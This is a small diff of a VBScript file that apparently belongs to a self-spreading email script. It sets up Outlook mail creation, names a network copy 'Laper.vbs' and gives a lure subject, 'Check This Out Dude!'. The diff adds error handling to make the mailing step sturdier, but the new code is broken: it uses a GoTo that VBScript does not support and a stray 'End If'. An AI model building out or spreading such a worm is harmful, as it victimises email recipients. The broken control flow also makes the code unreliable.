@@ -1,6 +1,14 @@
-Set objOutlook = CreateObject("Outlook.Application")
-Set objMail = objOutlook.CreateItem(0)
+Set objFSO = CreateObject("Scripting.FileSystemObject")
 
+On Error Resume Next
+Set objOutlook = CreateObject("Outlook.Application")
+If Err.Number <> 0 Then
+    ' Skip creating Outlook if the object can't be created
+    Err.Clear
+    GoTo SkipOutlook
+End If
+Set objMail = objOutlook.CreateItem(0)
+End If
 strFilePath = "\\network\share\Laper.vbs"
 strEmailSubject = "Check This Out Dude!"
 
